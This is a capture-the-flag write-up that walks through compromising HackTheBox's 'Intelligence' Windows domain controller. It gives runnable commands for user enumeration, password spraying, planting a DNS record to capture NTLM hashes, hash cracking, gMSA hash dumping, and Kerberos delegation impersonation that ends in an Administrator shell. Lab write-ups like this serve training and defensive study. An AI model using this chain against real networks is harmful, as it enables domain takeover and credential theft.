---
layout: single
title: Intelligence
date: 2023-11-14 
toc: true
classes: wide
excerpt: "Solving Intelligence machine from HackTheBox using active directory exploitation techniques"
header:
  teaser: /assets/images/hackthebox/intelligence/teaser.png
  teaser_home_page: true
categories:
  - machines
tags:
  - hackthebox
  - windows
---

![teaser](/assets/images/hackthebox/intelligence/teaser.png)

# Enumeration

To start enumerating, I used a tool that I developed which automates the initial OS and open ports services discovery by analyzing TTL information and using NMAP. The tool can be found here: [Reveal](https://github.com/Ignaciojhd/reveal)


```bash
sudo reveal -t 10.129.66.123 -f portsInfo
```

![Reveal](/assets/images/hackthebox/intelligence/Reaveal1.png)


The tool tells us that we are attacking a Windows machine and lists a bunch of opened ports. After a few moments it will also list  information about each opened port:


```python
Host is up (0.099s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Intelligence
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-11-14 05:09:58Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-11-14T05:11:28+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-11-14T05:11:29+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
|_ssl-date: 2023-11-14T05:11:28+00:00; +7h00m00s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-11-14T05:11:29+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49691/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49692/tcp open  msrpc         Microsoft Windows RPC
49705/tcp open  msrpc         Microsoft Windows RPC
49714/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2023-11-14T05:10:49
|_  start_date: N/A
```


We can see that port 88 for kerberos is opened and we can also see a **dc.intelligence.htb** domain name, so the machine is most likely a domain controller. Trying to list SMB share information or using a null session to gather information through RPC doesn't work so I checked the webpage. 


![Download](/assets/images/hackthebox/intelligence/Download.png)


There isn't much else besides two download buttons that redirect to a pdf file.


![pdfWeb](/assets/images/hackthebox/intelligence/pdfWeb.png)


## Analyzing PDF files

The available pdfs contain latin default text which isn't very helpful, but a pattern can be noticed for the naming of the pdfs. Each pdf uses the format yyyy-mm-dd-upload.pdf as a name. Maybe there are more pdfs in this directory for different dates. 

I created a wordlist for all the dates in the year 2020 using a handy tool I found here [Date Generator](https://github.com/Septimus4/dateGenerator) . You could use some bash scripting to accomplish the same but this tool does the trick just fine. 


```bash
python date_generator.py 2020 2021 0 "-" > dateList.txt
```

![dateList](/assets/images/hackthebox/intelligence/fuzzDatesList.png)


Using the outputted dates list, I used **wfuzz** to check if there were really any other files in this directory:


```bash
wfuzz -c -w dateList.txt --hc=404 -t 60 "http://10.129.95.154/documents/FUZZ-upload.pdf"
```

![fuzzDates](/assets/images/hackthebox/intelligence/fuzzDates.png)


Nice, there are many other pdfs. We can use a little bit of bash and wget to loop through and download the different pdf files using the previously generated dates list. If the file doesn't exist, wget won't download anything and will just show a small error on screen so we don't have to worry about creating another list for the dates discovered using wfuzz. 


```bash
for i in $(cat dateList.txt | xargs);do wget http://10.129.95.154/documents/$i-upload.pdf; done  
```

![downloadedpdfs](/assets/images/hackthebox/intelligence/pdfsDownloaded.png)


### Discovering Domain Users

Now that all the pdf files are downloaded, **exiftool** can be used to enumerate possible usernames from the file's meta data. The following command loops through each file and grabs the name listed as the creator of each file:


```bash
for i in $(ls | xargs); do exiftool $i | grep Creator | awk '{ print $3 }'; done
```

![UsersList](/assets/images/hackthebox/intelligence/UserList.png)


Many users are discovered through this process. These names are possible domain users but we can't tell for sure just by extracting pdf information.  A useful tool to validate domain users is [Kerbrute](https://github.com/ropnop/kerbrute) . We can pass a user list file and kerbrute will determine if each user is a valid domain user or not.


```bash
./kerbrute_linux_amd64 userenum --dc 10.129.95.154 -d 'intelligence.htb' -t 25 userList.txt
```

![ValidUsers](/assets/images/hackthebox/intelligence/ValidUsers.png)


### Leaked Information

All users are valid, great! I tried performing an ASREPRoast attack but it didn't work. At this point there isn't much left to do but check the pdf files for any additional information. There are many files, it would take quite some time to open one by one, so I used the following command to convert each pdf file to a txt file: 


```bash
for i in $(ls | xargs); do pdftotext $i; done 
```

![pdftotext](/assets/images/hackthebox/intelligence/pdftotext.png)


Now it's easier to cat the text from the pdfs.


```bash
cat *.txt
```

![leakedPass](/assets/images/hackthebox/intelligence/leakedPass.png)


After some scrolling, a file containing a new user guide with default credentials is discovered. We already have a list of valid domain users, therefore **crackmapexec** can be used to check if any of the users hasn't changed their default password.


```bash
crackmapexec smb 10.129.95.154 -u userList.txt -p 'NewIntelligenceCorpUser9876'
```

![tiffany](/assets/images/hackthebox/intelligence/tiffany.png)


# Using Tiffany's Credentials

Tiffany.Molina hasn't changed her default password. Using her credentials we can list smb shares and check if she has permission to read anything interesting:


```bash
crackmapexec smb 10.129.95.154 -u Tiffany.Molina -p 'NewIntelligenceCorpUser9876' --shares
```

![smbPerms](/assets/images/hackthebox/intelligence/smbPerms.png)


On the Users folder we can retrieve the user flag for the machine on Tiffany's desktop folder. After that, if we check the IT folder we can see there is a powershell script available.


```bash
smbclient \\\\10.129.95.154\\IT -U 'intelligence.htb\Tiffany.Molina%NewIntelligenceCorpUser9876'
```


![smbIT](/assets/images/hackthebox/intelligence/smbIT.png)


The contents of the script seems to be a scheduled task that checks every DNS record that starts with the word "web" using default credentials for the user running the script. At the end of the script we can see an email is sent to Ted.Graves if the web request is unsuccessful, this is probably another valid domain user and also the one running the script.


```powershell
# Check web server status. Scheduled to run every 5min
Import-Module ActiveDirectory 
foreach($record in Get-ChildItem "AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb" | Where-Object Name -like "web*")  {
try {
$request = Invoke-WebRequest -Uri "http://$($record.Name)" -UseDefaultCredentials
if(.StatusCode -ne 200) {
Send-MailMessage -From 'Ted Graves <Ted.Graves@intelligence.htb>' -To 'Ted Graves <Ted.Graves@intelligence.htb>' -Subject "Host: $($record.Name) is down"
}
} catch {}
}
```


If we were able to insert a new DNS A record that starts with "web" and points to our attacking machine's IP address, we could intercept the NetNTLMv2 hash and try to crack it. For this purpose, we can use [dnstool.py](https://github.com/dirkjanm/krbrelayx) to check if Tiffany can insert a new DNS record:


```bash
python3 dnstool.py -u intelligence.htb\\Tiffany.Molina -p NewIntelligenceCorpUser9876 --action add --record web-Ignacio --data 10.10.14.45 --type A 10.129.95.154
```

![dnsRecordAdded](/assets/images/hackthebox/intelligence/dnsRecordAdded.png)


We see a success message, but we can confirm that the record has actually been added by running the command once again.


![confirm](/assets/images/hackthebox/intelligence/confirm.png)


The record has been successfuly added and we can start listening for the hash with **responder** 


```bash
sudo responder -I tun0
```

![Responder.png](/assets/images/hackthebox/intelligence/Responder.png)


After a while, responder will capture Ted Grave's hash which can be easily cracked using hashcat and the rockyou password list:


```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

![crackedHash](/assets/images/hackthebox/intelligence/crackedHash.png)

# Using Ted's Credentials

Now that we have Ted's account compromised, let's run python bloodhound to see if there are any attack vectors that can lead to fully compromising the domain controller. if you don't have python bloodhound installed yet, it can be found here: [bloodhound.py](https://github.com/dirkjanm/BloodHound.py.git)  


```bash
python bloodhound.py -c ALL -u Ted.Graves -p Mr.Teddy -d intelligence.htb -dc intelligence.htb -ns 10.129.95.154
```

![BloodHoundScan](/assets/images/hackthebox/intelligence/BloodHoundScan.png)


After uploading the JSON files into Bloodhound, we can check shortest paths from compromised users. We can see that Ted is part of the ITSUPPORT group and that group has ReadGMSAPassword privilege over the SVC_INT account.


![TedToSvcBloodHound](/assets/images/hackthebox/intelligence/TedToSvcBloodHound.png)


Furthermore, if we inspect the SVC_INT node we can see that the service account is allowed to delegate to the domain controller. This allows for a complete attack vector towards the domain controller.


![delegateDC](/assets/images/hackthebox/intelligence/delegateDC.png)


## From Ted to Admin

First we will need to grab the service account's hash using [gMSADumper.py](https://github.com/micahvandeusen/gMSADumper) which is a tool that was developed by the creator of this machine. It reads any gMSA (Group Managed Service Accounts) password blobs that a compromised user can access and parses the values.


```bash
python3 gMSADumper.py -u ted.graves -p Mr.Teddy -l intelligence.htb -d intelligence.htb
```

![gMSADumper.png](/assets/images/hackthebox/intelligence/gMSADumper.png)


After obtaining the hash, **impacket-getST** can be used to request a Service Ticket and save it as ccache. Since the account has constrained delegation privileges, we can use the -impersonate flag to request a ticket on behalf of another user. The following command will impersonate the Administrator account and request a Service Ticket on its behalf for the www service on host dc.intelligence.htb (time must be synchronized with the dc for this to work). 


```bash
sudo ntpdate 10.129.95.154 # Syncronize time

impacket-getST -dc-ip 10.10.10.248 -spn www/dc.intelligence.htb -hashes :6c986cdcb965f2607f894fb257417f8e -impersonate administrator intelligence.htb/svc_int
```


Finally, Impacket’s wmiexec.py uses the Windows Management Instrumentation (WMI) to give us an interactive shell on the Windows host. Notice that we must set the environmental variable KRB5CCNAME to have the value of the name of the ccache file we just obtained with impacket-getST.  


```bash
KRB5CCNAME=administrator.ccache wmiexec.py -k -no-pass administrator@dc.intelligence.htb
```

![root](/assets/images/hackthebox/intelligence/root.png)


**Rooted!!**

